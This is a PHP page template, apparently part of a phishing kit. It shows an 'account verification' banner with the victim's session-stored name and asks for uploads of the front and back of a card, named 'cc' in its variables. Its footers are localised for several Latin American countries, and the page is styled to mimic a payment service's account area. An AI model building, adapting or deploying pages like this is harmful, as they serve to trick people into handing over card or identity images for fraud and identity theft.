<?php
session_start();
$fnames = $_SESSION['firstname'];
$lnames = $_SESSION['lastname'];
?>
<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
echo "<title>$title_bill</title>";
?>
    <link rel="stylesheet" type="text/css" href="../assets/css/desktop.css">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />
<style>
.image-upload1 > input
{
    display: none;
}
.image-upload > input
{
    display: none;
}
</style>
</head>
<body>
<div id="head"></div>
<div id="container">
    <div id="xheader">
        <div id="<?php echo $bahasas;?>navbar"></div>
        <div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 53px;z-index: 2;left: 0px;">

         <?php if(!empty($fnames)){ 
            echo "<b>$account_verif</b>";
         }else{
            echo "<b>$account_verif</b>";
        }


            ?> 
            </div>
        <div id="account_type">
        <?php 
        echo $account_id;
        ?> 

        <b> <?php if(!empty($xuser)){ echo $xuser;}else{echo "";}?> </b> </div>
        <div id="logout"></div>
        <font id="logout0"><a href="#" style="color:#fff;text-decoration: none;"><?php echo $sign_out;?></a></font>
    </div>
    <script>
        function readURLdesktop(input) {
        if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function (e) {
                $('#gambardesktop')
                    .attr('src', e.target.result)
                    .width(400)
                    .height(280);
            };

            reader.readAsDataURL(input.files[0]);
        }
    }
    </script>
    <div id="xcontent">
        <form action="" method="POST" enctype="multipart/form-data" >
        <font class="xFont" style="top:35px;left:2px;"><?php echo $upload_id;?></font>
            
            <hr style="top:610px;">
                        <br><br>
            <font class="xFont2" style="top:32px;left:280px;"><b><?php echo $selectid;?></b></font>
            <font class="xFont3" style="top:60px;left:280px;">
                <li><?php echo $katacc;?></li><br>
            <img id="gambardesktop" width="390" src="../assets/img/uploadcc.png">
            <br><br>
            <font class="xFont2"><b><?php echo $frontcc;?></b></font><br><br>
            <input id="file-input2" name="file" type="file" required>
            <br><br>
            <font class="xFont2"><b><?php echo $backcc;?></b></font><br><br>
            <input id="file-input2" name="file2" type="file" required>
            </font>
            
                        <br><br>

<button class="button rect" type="submit" style="
    position: absolute;
    top: 650px;
    left: 280px;
    width: 259px;
    padding:6px;">
<span><?php echo $save;?></span>
</button>


            </form>
    </div>
    
</div>
<div id="containerfooter">
<?php
if($lang == "PE") {?>
<div id="pefooterbawah"></div>
<?php
}?>
<?php
if($lang == "CO") {?>
<div id="cofooterbawah"></div>
<?php
}?>
<?php
if($lang == "MX") {?>
<div id="mxfooterbawah"></div>
<?php
}?>
<?php
if($lang == "AR") {?>
<div id="arfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PY") {?>
<div id="pyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "UY") {?>
<div id="uyfooterbawah"></div>
<?php
}?>
<?php
if($lang == "EC") {?>
<div id="ecfooterbawah"></div>
<?php
}?>
<?php
if($lang == "PE" or $lang == "MX" or $lang == "CO" or $lang == "AR" or $lang == "UY" or $lang == "PY" or $lang == "EC") {
}else{?>
<div id="<?php echo $bahasas;?>footerbawah"></div>
<?php
}
?>
</div>
<script src="../assets/js/main.js"></script></script>
<script type="text/javascript" src="../assets/js/jquery.validate.min.js"></script>

</body>
</html>
